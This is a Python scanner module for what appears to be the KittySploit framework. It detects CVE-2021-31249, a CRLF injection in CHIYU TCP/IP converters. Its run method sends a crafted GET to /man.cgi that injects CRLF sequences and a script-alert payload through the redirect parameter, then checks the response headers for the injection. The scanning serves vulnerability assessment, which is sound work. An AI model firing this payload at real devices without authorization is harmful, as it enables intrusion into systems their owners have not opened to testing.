#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CHIYU TCP/IP Converter BF-430, BF-431, and BF-450 are susceptible to carriage return line feed injection."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CHIYU TCP/IP Converter - Carriage Return Line Feed Injection Detection',
        'description': 'CHIYU TCP/IP Converter BF-430, BF-431, and BF-450 are susceptible to carriage return line feed injection. The redirect= parameter, available on multiple CGI components, is not properly validated, thus enabling an attacker to obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'chiyu', 'crlf', 'iot', 'chiyu-tech', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31249',
            'https://www.chiyu-tech.com/msg/message-Firmware-update-87.html',
            'https://seguranca-informatica.pt/dancing-in-the-iot-chiyu-devices-vulnerable-to-remote-attacks/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-31249',
        ],
        'cve': 'CVE-2021-31249',
    }

    def run(self):
        r = self.http_request(method="GET", path='/man.cgi?redirect=setting.htm%0d%0a%0d%0a<script>alert(document.domain)</script>&failure=fail.htm&type=dev_name_apply&http_block=0&TF_ip0=192&TF_ip1=168&TF_ip2=200&TF_ip3=200&TF_port=&TF_port=&B_mac_apply=APPLY', allow_redirects=False)
        if not r or r.status_code != 302:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('Location: setting.htm', '<script>alert(document.domain)</script>',)
        if (all(m in headers for m in header_all)):
            self.set_info(
                severity='medium',
                reason="CHIYU TCP/IP Converter - Carriage Return Line Feed Injection detected",
                path='/man.cgi?redirect=setting.htm%0d%0a%0d%0a<script>alert(document.domain)</script>&failure=fail.htm&type=dev_name_apply&http_block=0&TF_ip0=192&TF_ip1=168&TF_ip2=200&TF_ip3=200&TF_port=&TF_port=&B_mac_apply=APPLY',
            )
            return True
        return False

